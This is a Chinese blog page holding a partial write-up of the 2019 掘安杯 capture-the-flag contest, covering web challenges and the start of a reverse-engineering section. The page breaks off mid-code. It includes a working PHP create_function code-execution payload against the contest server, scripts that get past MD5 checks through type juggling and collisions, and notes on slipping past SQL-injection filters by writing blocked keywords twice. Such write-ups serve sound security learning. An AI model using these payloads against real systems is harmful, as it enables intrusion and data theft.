<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.8.0">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content>
    <meta name="keyword" content>
    <link rel="shortcut icon" href="/img/favicon.ico">

    <title>
        
        2019年掘安杯部分wp - 萝卜
        
    </title>

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/aircloud.css">
    <link rel="stylesheet" href="/css/gitment.css">
    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
    <!-- ga & ba script hoook -->
    <script></script>
</head>

<body>

<div class="site-nav-toggle" id="site-nav-toggle">
    <button>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
        <span class="btn-bar"></span>
    </button>
</div>

<div class="index-about">
     你若盛开，清风自来！ 
</div>

<div class="index-container">
    
    <div class="index-left">
        
<div class="nav" id="nav">
    <div class="avatar-name">
        <div class="avatar radius">
            <img src="/img/avatar.jpg">
        </div>
        <div class="name">
            萝卜
        </div>
    </div>
    <div class="contents" id="nav-content">
        <ul>
            <li>
                <a href="/">
                    <i class="iconfont icon-shouye1"></i>
                    <span>HOME</span>
                </a>
            </li>
            <li>
                <a href="/tags">
                    <i class="iconfont icon-biaoqian1"></i>
                    <span>TAGS</span>
                </a>
            </li>
            <li>
                <a href="/archives">
                    <i class="iconfont icon-guidang2"></i>
                    <span>ARCHIVES</span>
                </a>
            </li>
            <li>
                <a href="/about/">
                    <i class="iconfont icon-guanyu2"></i>
                    <span>ABOUT</span>
                </a>
            </li>
            
            <li>
                <a id="search">
                    <i class="iconfont icon-sousuo1"></i>
                    <span>SEARCH</span>
                </a>
            </li>
            
        </ul>
    </div>
    
        <div id="toc" class="toc-article">
    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web签到"><span class="toc-text">web签到</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jactf-jasafe110qweasdzxc"><span class="toc-text">jactf{jasafe110qweasdzxc}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#网站被黑"><span class="toc-text">网站被黑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#下载下载"><span class="toc-text">下载下载</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#myCTF-cssohw456954GUEB"><span class="toc-text">myCTF{cssohw456954GUEB}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#not-easy"><span class="toc-text">not_easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#audit"><span class="toc-text">audit</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-jactf-c795359da56ae38ec9132eaad24733fc"><span class="toc-text">flag:jactf{c795359da56ae38ec9132eaad24733fc}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#曲折的人生"><span class="toc-text">曲折的人生</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：flag-Good-luck"><span class="toc-text">flag：flag{Good luck!}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reverse"><span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#reverse-签到"><span class="toc-text">reverse 签到</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#re-easy"><span class="toc-text">re_easy</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-bdctf-YOU-CRAKE-THE-RC4"><span class="toc-text">flag: bdctf{YOU_CRAKE_THE_RC4}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#baby-reverse"><span class="toc-text">baby_reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag：jactf-w0w-is-flag"><span class="toc-text">flag：jactf{w0w_is_flag}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#py"><span class="toc-text">py</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-3bc94420543503a331632867d3cdd82"><span class="toc-text">flag:3bc94420543503a331632867d3cdd82</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RE-crypto"><span class="toc-text">RE_crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flag-flag-Th1s-1s-Simple-Rep1ac3-Enc0d3"><span class="toc-text">flag:flag{Th1s_1s_Simple_Rep1ac3_Enc0d3}</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#encrypt"><span class="toc-text">encrypt</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jactf-122333-Pangolin"><span class="toc-text">jactf{122333_Pangolin}</span></a></li></ol></li></ol></li></ol>
</div>
    
</div>


<div class="search-field" id="search-field">
    <div class="search-container">
        <div class="search-input">
            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
            <input id="search-input">
            <span id="begin-search">search</span>
        </div>
        <div class="search-result-container" id="search-result-container">

        </div>
    </div>
</div>

        <div class="index-about-mobile">
            <i> 你若盛开，清风自来！ </i>
        </div>
    </div>
    
    <div class="index-middle">
        <!-- Main Content -->
        


<div class="post-container">
    <div class="post-title">
        2019年掘安杯部分wp
    </div>

    <div class="post-meta">
        <span class="attr">Post：<span>2019-04-08 23:42:42</span></span>
        
        <span class="attr">Tags：/
        
        <a class="tag" href="/tags/#WP" title="WP">WP</a>
        <span>/</span>
        
        
        </span>
        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
</span>

    </div>
    <div class="post-content no-indent">
        <p>还差点</p>
<a id="more"></a>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="web签到"><a href="#web签到" class="headerlink" title="web签到"></a>web签到</h3><p>打开页面后发现一个超链接，查看源代码发现是跳转到flag.php的，点击超链接之后发现又跳转到了404.php，那么我们在中间抓包，发现加密的flag，base64解密即可</p>
<p><img src="https://s2.ax1x.com/2019/04/08/A5wXsf.png" alt> </p>
<h4 id="jactf-jasafe110qweasdzxc"><a href="#jactf-jasafe110qweasdzxc" class="headerlink" title="jactf{jasafe110qweasdzxc}"></a>jactf{jasafe110qweasdzxc}</h4><h3 id="网站被黑"><a href="#网站被黑" class="headerlink" title="网站被黑"></a>网站被黑</h3><p>bugku原题</p>
<h3 id="下载下载"><a href="#下载下载" class="headerlink" title="下载下载"></a>下载下载</h3><p>查看源代码发现提示下载flag.php，直接在url上添加</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.1.69:10002/?file=flag.php</span><br></pre></td></tr></table></figure>
<p>flag.php中是一个加密函数和一个解密函数，key和密文已经给出，直接调用解密函数即可</p>
<h4 id="myCTF-cssohw456954GUEB"><a href="#myCTF-cssohw456954GUEB" class="headerlink" title="myCTF{cssohw456954GUEB}"></a>myCTF{cssohw456954GUEB}</h4><h3 id="not-easy"><a href="#not-easy" class="headerlink" title="not_easy"></a>not_easy</h3><p>也是一个原题，通过匿名函数和闭合括号可以造成任意代码执行</p>
<p>payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://120.79.1.69:10006/?action=\create_function&amp;arg=)&#123;&#125;system(%22ls%22);/*</span><br><span class="line"></span><br><span class="line">http://120.79.1.69:10006/?action=\create_function&amp;arg=)&#123;&#125;system(%22cat%20Th1s_1S_F1a9_Hav3_Fun%22);/*</span><br></pre></td></tr></table></figure></p>
<h3 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h3><p>代码审计题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$str1 = @$_GET[&apos;str1&apos;];</span><br><span class="line">$str2 = @$_GET[&apos;str2&apos;];</span><br><span class="line">$str3 = @$_GET[&apos;str3&apos;];</span><br><span class="line">$str4 = @$_GET[&apos;str4&apos;];</span><br><span class="line">$str5 = (string)@$_POST[&apos;str5&apos;];</span><br><span class="line">$str6 = (string)@$_POST[&apos;str6&apos;];</span><br><span class="line">$str7 = (string)@$_POST[&apos;str7&apos;];</span><br><span class="line">if( $str1 == $str2 )&#123;</span><br><span class="line">    die(&apos;str1 OR Sstr2 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(&apos;step 1 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str3 == $str4 )&#123;</span><br><span class="line">    die(&apos;str3 OR str4 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(&apos;step 2 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span><br><span class="line">    die(&apos;str5 OR str6 OR str7 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(&apos;step 3 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&apos;a&apos;];</span><br><span class="line">$b = $_POST[&apos;b&apos;];</span><br><span class="line">$m = $_GET[&apos;m&apos;];</span><br><span class="line">$n = $_GET[&apos;n&apos;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str8 = hash(&apos;md5&apos;, $a, false);</span><br><span class="line">$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You&apos;re great,give you flag:&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str1 OR Sstr2 no no no</span><br></pre></td></tr></table></figure></p>
<ul>
<li>第一步利用弱类型可以绕过</li>
<li>第二步可以利用数组来绕过</li>
<li>第三步可以利用md5相同的文件来绕过<br><a href="https://github.com/thereal1024/python-md5-collision" target="_blank" rel="noopener">利用工具</a></li>
<li>最后一步也可以利用弱类型老绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strtr(string,from,to)</span><br><span class="line">把string字符串中的from的每一个字符替换成相应的to字符</span><br></pre></td></tr></table></figure>
<p>实例：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$a=&quot;aaaabbbb&quot;;</span><br><span class="line">echo $a.&quot;&lt;br&gt;&quot;;</span><br><span class="line">$b = strtr($a,&quot;a&quot;, &quot;1&quot;);</span><br><span class="line"> echo $b.&quot;&lt;br&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">页面输出：</span><br><span class="line">aaaabbbb</span><br><span class="line">1111bbbb</span><br></pre></td></tr></table></figure></p>
<p>首先生成一个只含有2个字母的md5值并且是0e开头的并且是6位数字加密的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,999999):</span><br><span class="line">  if md5(str(i))[0:2] == &apos;0e&apos;:</span><br><span class="line">    if &apos;a&apos; not in md5(str(i))[2:]:</span><br><span class="line">      if &apos;b&apos; not in md5(str(i))[2:]:</span><br><span class="line">        if &apos;e&apos; not in md5(str(i))[2:]:</span><br><span class="line">          if &apos;f&apos; not in md5(str(i))[2:]:</span><br><span class="line">            print i</span><br><span class="line">            </span><br><span class="line">            </span><br><span class="line">out：988370</span><br></pre></td></tr></table></figure></p>
<p>getflag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import hashlib</span><br><span class="line">def md5(str):</span><br><span class="line">  p= hashlib.md5(str).hexdigest()</span><br><span class="line">  return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,999999):</span><br><span class="line">  if md5(str(i))[0:2] == &apos;0e&apos;:</span><br><span class="line">    if &apos;a&apos; not in md5(str(i))[2:]:</span><br><span class="line">      if &apos;b&apos; not in md5(str(i))[2:]:</span><br><span class="line">        if &apos;e&apos; not in md5(str(i))[2:]:</span><br><span class="line">          if &apos;f&apos; not in md5(str(i))[2:]:</span><br><span class="line">            print i</span><br><span class="line"></span><br><span class="line">url=&quot;http://120.79.1.69:10007/?str1[]=1&amp;str2[]=2&amp;str3[]=3&amp;str4[]=4&amp;m=cd&amp;n=12&quot;</span><br><span class="line">data1 = open(&apos;./out_test_028.txt&apos;,&apos;r&apos;).read()</span><br><span class="line">data2 = open(&apos;./out_test_029.txt&apos;,&apos;r&apos;).read()</span><br><span class="line">data3 = open(&apos;./out_test_030.txt&apos;,&apos;r&apos;).read()</span><br><span class="line">data= &#123;</span><br><span class="line">  &apos;str5&apos;:data1,</span><br><span class="line">  &apos;str6&apos;:data2,</span><br><span class="line">  &apos;str7&apos;:data3,</span><br><span class="line">  &apos;a&apos;:&apos;QNKCDZO&apos;,</span><br><span class="line">  &apos;b&apos;:&apos;988370&apos;</span><br><span class="line">&#125;</span><br><span class="line">r= requests.post(url=url,data=data)</span><br><span class="line">print r.content</span><br></pre></td></tr></table></figure></p>
<h4 id="flag-jactf-c795359da56ae38ec9132eaad24733fc"><a href="#flag-jactf-c795359da56ae38ec9132eaad24733fc" class="headerlink" title="flag:jactf{c795359da56ae38ec9132eaad24733fc}"></a>flag:jactf{c795359da56ae38ec9132eaad24733fc}</h4><h3 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h3><p>进过测试发现用户名和处存在sql注入，过滤了空格、select、union、or，我们可以进行双写绕过<br><img src="https://s2.ax1x.com/2019/04/08/A5wjL8.png" alt><br><img src="https://s2.ax1x.com/2019/04/08/A5wxeS.png" alt><br>得到username和password<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">goodboy_g-60Hellowor</span><br><span class="line">ajahas&amp;&amp;*44askldajaj</span><br></pre></td></tr></table></figure></p>
<p>登录的时候要注意，用户名中也存在一个or，所以也要进行双写绕过，验证码需要3秒内提交，所以需要python脚本来跑</p>
<p>脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf-8</span><br><span class="line">import requests</span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">url = &quot;http://120.79.1.69:10005/index.php?check&quot;</span><br><span class="line">while True:</span><br><span class="line">	conn= requests.session()</span><br><span class="line">	res = conn.get(url)</span><br><span class="line">	res_text = res.text</span><br><span class="line">	bs_res = BeautifulSoup(res_text,&quot;lxml&quot;)	</span><br><span class="line"></span><br><span class="line">	a = str(bs_res.find_all(name=&apos;div&apos;,attrs=&#123;&quot;class&quot;:&quot;rep&quot;&#125;)).replace(&quot;\\uff08&quot;,&quot;(&quot;).replace(&quot;\\uff09&quot;,&quot;)&quot;).replace(&quot;X&quot;,&quot;*&quot;)[18:-7]</span><br><span class="line">	print a</span><br><span class="line">	num = eval(a)	</span><br><span class="line"></span><br><span class="line">	data = &#123;</span><br><span class="line">		&quot;username&quot;:&quot;goodboy_g-60Hellowoorr&quot;,</span><br><span class="line">		&quot;password&quot;:&quot;ajahas&amp;&amp;*44askldajaj&quot;,</span><br><span class="line">		&quot;code&quot;:num</span><br><span class="line">	&#125;</span><br><span class="line">	end_res = conn.post(url,data)</span><br><span class="line">	if &quot;验证码不正确&quot; not in end_res.content:</span><br><span class="line">		print end_res.content</span><br><span class="line">		break</span><br></pre></td></tr></table></figure></p>
<p>提交之后可以发现有一个zip压缩包的链接，压缩包密码已给出：<br><img src="https://s2.ax1x.com/2019/04/08/A5wzdg.png" alt> </p>
<p>解压之后还有一个压缩包和一个txt文档：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">Private Function getPassword(ByVal str As String) As String</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Dim reString As String</span><br><span class="line">    </span><br><span class="line">    Dim i As Integer</span><br><span class="line">    i = 1</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    While (i &lt;= Len(str))</span><br><span class="line">    </span><br><span class="line">     reString = reString &amp; Mid(str, i, 1)</span><br><span class="line">     i = i + (i Mod 5)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    Wend</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    getPassword = reString</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Private Sub Command1_Click()</span><br><span class="line"></span><br><span class="line">   Dim Dictionary As String</span><br><span class="line">    </span><br><span class="line">   Dictionary = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">   </span><br><span class="line">   Dim password As String</span><br><span class="line">   </span><br><span class="line">   password = getPassword(Dictionary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   Dim psw As String</span><br><span class="line">   </span><br><span class="line">   psw = Text1.Text</span><br><span class="line">   </span><br><span class="line"></span><br><span class="line">   If (psw = password) Then</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;The password is correct!&quot;, vbOKOnly, &quot;密码正确&quot;</span><br><span class="line">    </span><br><span class="line">    Text1.Text = &quot;Password for next pass : &quot; &amp; getPassword(password)</span><br><span class="line">       </span><br><span class="line">   Else</span><br><span class="line">   </span><br><span class="line">    MsgBox &quot;PasswordFail!&quot;, vbOKOnly, &quot;密码错误&quot;</span><br><span class="line">    </span><br><span class="line">      </span><br><span class="line">   End If</span><br><span class="line">   </span><br><span class="line">      </span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure>
<p>我也不知道这是那种语言的代码，但是这种代码可读性很好</p>
<p>首先第一句话的意思就是定义一个函数，返回值是string类型，有一个str参数，类型也是string类型<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Private Function getPassword(ByVal str As String) As String</span><br></pre></td></tr></table></figure></p>
<p>在函数内定义了一个string类型的变量dim，有定义了一个int类型的变量i，并对i进行了赋初值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Dim reString As String</span><br><span class="line">Dim i As Integer</span><br><span class="line">i = 1</span><br></pre></td></tr></table></figure></p>
<p>然后来了一个循环，在这个循环中，对变量reString进行字符串加操作，取出参数str的第i位，i的变化是i=i+(i%5)，然后将变量reString返回</p>
<p>Command1_Click函数中是有一个字符串，当做参数传到getPassword函数中，将返回的新字符串和正确字符串比较，若一致的话，压缩包的密码就是新字符串当做参数再次传到getPassword函数中的返回值</p>
<p>求密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = &quot;VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU=&quot;</span><br><span class="line">def getpassword(str1):</span><br><span class="line">  password=&quot;&quot;</span><br><span class="line">  i=1</span><br><span class="line">  while i&lt;=len(str1):</span><br><span class="line">    password+=str1[i-1]</span><br><span class="line">    i=i+(i%5)</span><br><span class="line">  return password</span><br><span class="line"></span><br><span class="line">print getpassword(getpassword(data))</span><br></pre></td></tr></table></figure></p>
<p>得出密码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</span><br></pre></td></tr></table></figure></p>
<p>解压缩flag.zip之后发现图片打不开，用winhex打开发现flag</p>
<h4 id="flag：flag-Good-luck"><a href="#flag：flag-Good-luck" class="headerlink" title="flag：flag{Good luck!}"></a>flag：flag{Good luck!}</h4><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="reverse-签到"><a href="#reverse-签到" class="headerlink" title="reverse 签到"></a>reverse 签到</h3><p>win32可执行文件，无壳，拖入IDA，shift+f12就可以看到flag</p>
<h3 id="re-easy"><a href="#re-easy" class="headerlink" title="re_easy"></a>re_easy</h3><p>main函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 v3; // rax</span><br><span class="line">  int i; // [rsp+Ch] [rbp-24h]</span><br><span class="line">  char s[24]; // [rsp+10h] [rbp-20h]</span><br><span class="line">  unsigned __int64 